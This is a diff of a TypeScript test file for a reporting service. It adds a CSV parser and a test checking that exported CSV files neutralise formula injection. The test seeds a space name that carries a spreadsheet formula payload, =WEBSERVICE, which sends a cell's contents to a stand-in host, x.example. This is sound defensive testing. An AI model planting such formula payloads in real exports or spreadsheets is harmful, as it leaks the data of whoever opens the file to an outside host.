@@ -1,7 +1,38 @@
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
 import { OutboxDispatcher } from '../../../kernel';
 import { idempotencyStoreContains, type TestApp } from '../../../testing';
+import { seedResource } from '../../scheduling';
 import { get, HOUR, post, reportingTestApp, staff, type Actor } from './support';
+
+/** RFC 4180 reader for the assertions: the cells of every record of a CSV text. */
+function parseCsv(text: string): string[][] {
+  const records: string[][] = [];
+  let record: string[] = [];
+  let cell = '';
+  let quoted = false;
+  for (let i = 0; i < text.length; i += 1) {
+    const ch = text[i]!;
+    if (quoted) {
+      if (ch === '"' && text[i + 1] === '"') {
+        cell += '"';
+        i += 1;
+      } else if (ch === '"') quoted = false;
+      else cell += ch;
+    } else if (ch === '"') quoted = true;
+    else if (ch === ',') {
+      record.push(cell);
+      cell = '';
+    } else if (ch === '\r' && text[i + 1] === '\n') {
+      record.push(cell);
+      records.push(record);
+      record = [];
+      cell = '';
+      i += 1;
+    } else cell += ch;
+  }
+  if (cell !== '' || record.length > 0) records.push([...record, cell]);
+  return records;
+}
 
 const DATE = '2027-02-03';
 
@@ -334,6 +365,36 @@ describe('exports (SPK-REPORT-007, §4.14 expiring exports)', () => {
     });
     expect(twice.status).toBe(409);
     expect(twice.body.code).toBe('INVALID_TRANSITION');
+  });
+
+  it('§4.14 (R3-REPORTING-09): a space name with a comma, a quote and a formula stays inside its preamble cell; no exported cell starts a formula', async () => {
+    const hostile = 'Pitch 3,=WEBSERVICE("https://x.example/?"&A2),';
+    await seedResource(t.db, {
+      organizationId: t.organizationId,
+      facilityId: t.facilityId,
+      name: hostile,
+    });
+    const run = await post(t, '/v1/reports/runs', scheduler, {
+      report: 'utilization',
+      parameters: { facilityId: t.facilityId, from: DATE, to: DATE },
+    });
+    expect(run.status, JSON.stringify(run.body)).toBe(201);
+    expect((run.body.result.disclosures as string[]).join(' ')).toContain(hostile);
+    const created = await post(t, '/v1/reports/exports', scheduler, {
+      reportRunId: run.body.id,
+      format: 'csv',
+    });
+    expect(created.status, JSON.stringify(created.body)).toBe(201);
+    const file = await download(scheduler, created.body.id, created.body.downloadToken);
+    expect(file.status, file.text).toBe(200);
+    const records = parseCsv(file.text);
+    const preamble = records.filter((r) => r[0]!.startsWith('# '));
+    expect(preamble.length).toBeGreaterThan(5);
+    // Every preamble line is exactly one cell, the hostile name inside it.
+    expect(preamble.every((r) => r.length === 1)).toBe(true);
+    expect(preamble.some((r) => r[0]!.includes(hostile))).toBe(true);
+    // No cell of the export starts with a formula prefix.
+    expect(records.flat().filter((c) => /^[=+@\t\r]/.test(c) || /^-[^0-9]/.test(c))).toEqual([]);
   });
 
   it('SPK-REPORT-007: authority is re-checked at download — a requester whose staff access ended cannot download', async () => {
